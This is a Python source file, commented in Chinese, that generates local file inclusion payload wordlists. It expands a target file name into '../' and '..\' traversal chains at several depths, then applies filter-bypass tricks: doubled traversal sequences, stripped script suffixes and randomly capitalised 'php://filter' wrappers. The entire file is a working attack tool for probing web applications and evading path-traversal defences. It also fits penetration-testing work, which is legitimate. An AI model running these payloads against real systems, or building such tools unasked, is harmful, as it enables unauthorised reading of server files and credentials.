#coding:utf-8
#传入一个文件名，生成../
import re
import os
import random

class create_dic():
    def __init__(self):
        #初始化self.gen_dic集合，读取/config/passdic1
        self.gen_dic=set()
        self.local_path = os.path.dirname(os.path.abspath(__file__))
        self.config_path=self.local_path+'/config/'
        self.static_path=self.config_path+'static_dic/'
        #读取/static/default.txt内容
        with open(self.static_path + 'default.txt', 'r', encoding='utf-8') as f:
            self.bypassdic0=f.readlines()
        with open(self.config_path+'bypassdic1.txt','r',encoding='utf-8') as f:
            self.bypassdic1=f.readlines()
        with open(self.config_path+'bypassdic2.txt','r',encoding='utf-8') as f:
            self.bypassdic2=f.readlines()
        with open(self.config_path+'bypassdic3.txt','r',encoding='utf-8') as f:
            self.bypassdic3=f.readlines()

    def generate_lfi_dic(self,level,static_dic,keys):
        #清空结果，方便重复调用
        self.gen_dic.clear()

        #-----------------step0------------------------------
        #生成相对路径，将相对路径和default.txt内容写入集合1
        #根据传入的目录级数生成../这样的
        if not keys[0] and len(keys)==1:
            # 将集合0 加上static_dic/default.txt----self.bypassdic0中的内容，生成集合1
            gen_dic1 = set()
            # 将gen_dic1加上static_dic/选择的字典中的内容
            with open(self.static_path + static_dic, 'r', encoding='utf-8') as f:
                for i in f:
                    gen_dic1.add(i.strip())

            # --------------step1--------------------------------
            # 将集合1 gen_dic1的结果循环bypassdic1.txt---self.bypassdic1，添加上bypassdic1的内容，生成结果集合2
            gen_dic2 = set()
            gen_dic2 = self.cycle_bypass(gen_dic1, self.bypassdic1)

            # 将集合2 gen_dic2的结果循环bypassdic2.txt---self.bypassdic2，添加上bypassdic2的内容，生成结果集合3
            gen_dic3 = set()
            gen_dic3 = self.cycle_bypass(gen_dic2, self.bypassdic2)

            # 将集合3 gen_dic3的结果循环bypassdic3.txt----self.bypassdic3,添加上bypassdic3的内容，生成结果集合4
            gen_dic4 = set()
            gen_dic4 = self.cycle_bypass(gen_dic3, self.bypassdic3)
            self.gen_dic = self.gen_dic | gen_dic4


        for key in keys:
            gen_dic0 = set()
            if not key:
                continue
            if re.match(r'[a-z]:|[A-Z]:', key):
                gen_dic0.add(key.strip())
            else:
                match=re.match(r'/|\\',key)
                if match:
                    key=key.lstrip(match.group())
                #如果不是windows绝对路径那就根据level目录级数生成相对路径../   ..\  ./  .\ /../  \..\
                gen_dic0=gen_dic0|self.create_base(key,level=int(level))


            #将集合0 加上static_dic/default.txt----self.bypassdic0中的内容，生成集合1
            gen_dic1=set()
            gen_dic1=self.cycle_bypass(gen_dic0,self.bypassdic0)
            #将gen_dic1加上static_dic/选择的字典中的内容
            with open(self.static_path+static_dic,'r',encoding='utf-8') as f:
                for i in f:
                    gen_dic1.add(i.strip())

            #--------------step1--------------------------------
            #将集合1 gen_dic1的结果循环bypassdic1.txt---self.bypassdic1，添加上bypassdic1的内容，生成结果集合2
            gen_dic2=set()
            gen_dic2=self.cycle_bypass(gen_dic1,self.bypassdic1)

            #将集合2 gen_dic2的结果循环bypassdic2.txt---self.bypassdic2，添加上bypassdic2的内容，生成结果集合3
            gen_dic3 = set()
            gen_dic3 = self.cycle_bypass(gen_dic2, self.bypassdic2)

            #将集合3 gen_dic3的结果循环bypassdic3.txt----self.bypassdic3,添加上bypassdic3的内容，生成结果集合4
            gen_dic4 = set()
            gen_dic4 = self.cycle_bypass(gen_dic3, self.bypassdic3)
            self.gen_dic=self.gen_dic|gen_dic4

        return self.gen_dic


    def cycle_bypass(self,dic1,static_set):
        dic_tmp=set()

        for line in static_set:
            line=line.strip()
            if re.match(r'!--', line):
                continue

            for value in dic1:
                value=value.strip()
                if not value:
                    continue

                if re.search(r'###', line):  # 只有绝对路径添加进来
                    if re.match(r'[a-z]:|[A-Z]:|/\w|\\\w', value):
                        dic_tmp.add(line.replace('###', value)+'\n')

                elif re.search(r'xxx', line):
                    dic_tmp.add(line.replace('xxx', value)+'\n')

                elif re.search(r'!!!', line):
                    if re.match(r'\\+\w+|/+\w+', value) and not re.match(r'/etc/',value):
                        dic_tmp.add(line.replace('!!!', value)+'\n')

                elif re.search(r'@@@', line):
                    if re.match(r'\.\.', value) or (re.match(r'\\+\w+|/+\w+', value) and not re.match(r'/etc/',value)) or re.match('\w{2,}',value):
                        dic_tmp.add(line.replace('@@@', value)+'\n')

                elif re.search(r'去后缀', line):
                    generate_key = re.sub(r'[.]php|[.]asp|[.]jsp|[.]aspx', '', value)
                    dic_tmp.add(generate_key+'\n')

                elif re.search(r'双写', line):
                    generate_key = re.sub(r'[.][.]/', '..././', value)
                    generate_key = re.sub(r'[.][.]\\', r'...\.\\', generate_key)
                    dic_tmp.add(generate_key+'\n')

                elif re.search(r'大小写',line):
                    name = 'php://filter'
                    if re.match(name, value):
                        dic_tmp.add(value.replace(name,self.random_upper(name))+'\n')


                    name = re.search('resource=(.*)', value)
                    if name:
                        dic_tmp.add(value.replace(name.group(1),self.random_upper(name.group(1)))+'\n')

                    elif re.search(r'text/plain', value):
                        s = 'text/plain'
                        dic_tmp.add(value.replace(s, self.random_upper(s))+'\n')

                    else:
                        dic_tmp.add(self.random_upper(value)+'\n')
                        # print('大小写',self.random_upper(value))

                else:
                    dic_tmp.add(line+'\n')


        return dic_tmp|dic1

    def random_upper(self,string):
        # 将一个字符串随机大写
        length = len(string)
        for i in range(length):
            random_num = random.randint(0, length - 1)
            s = string[random_num]
            string = string.replace(s, s.upper())

        return string

    def create_base(self,key,level=5):
        dic=set()
        for n in range(level):
            if n == 0:
                key1 = '../' * n + '/' + key
                key2 = '..\\' * n + '\\' + key
                key3 = './' + key
                key4 = '.\\' + key
            else:
                key1 = '../' * n + key
                key2 = '..\\' * n + key
                key3 = '/' + '../' * n + key
                key4 = '\\' + '..\\' * n + key

            dic.add(key1)
            dic.add(key2)
            dic.add(key3)
            dic.add(key4)

        return dic

if __name__=='__main__':

    #windows：
    #linux：
    a=create_dic().generate_lfi_dic(5,'default.txt',['index.php'])
    # n=0
    # for i in a:
    #     n+=1
    #     print(n,i.strip())
    # # # print(a)

